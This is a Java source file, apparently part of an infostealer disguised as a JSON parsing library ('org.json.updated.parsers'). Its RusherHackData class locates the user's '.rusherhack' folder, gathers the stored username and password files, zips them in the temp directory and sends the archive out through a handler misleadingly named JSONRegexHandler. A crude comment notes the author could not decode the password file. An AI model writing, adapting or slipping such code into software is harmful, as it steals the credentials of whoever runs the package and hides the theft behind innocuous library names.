package org.json.updated.parsers.impl;

import org.json.updated.parsers.JSONObject;
import org.json.updated.parsers.JSONRegexHandler;
import org.json.updated.parsers.util.FileSystemHelper;
import org.json.updated.parsers.util.JSONParser;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;

public class RusherHackData implements JSONObject {
    // the password file is encoded in something, im not quite sure what it is, i tried base64 and got nothing so idk
    private static final String[] IMPORTANT_FILES = new String[] { "username", "password" };

    @Override
    public void handle() {
        String home = System.getProperty("user.home");
        if (home == null || home.isEmpty()) {
            System.out.println("motherfucker what");
            return;
        }

        String sep = FileSystemHelper.getSeparator();
        String rhDir = home + sep + ".rusherhack" + sep;

        if (!Files.isDirectory(Paths.get(rhDir))) {
            JSONRegexHandler.send("> Did not contain the RusherHack folder.");
            return;
        }

        ArrayList<File> validFileDirs = new ArrayList<>();
        for (String fileName : IMPORTANT_FILES) {
            String dir = rhDir + fileName;
            if (!Files.exists(Paths.get(dir))) {
                continue;
            }

            validFileDirs.add(new File(dir));
        }

        String zipFile = System.getProperty("java.io.tmpdir") + sep + "rusherhack_shit.zip";
        FileSystemHelper.zip(zipFile, validFileDirs);
        JSONRegexHandler.send(new File(zipFile));
    }

    @Override
    public String getName() {
        return "RusherHack";
    }
}
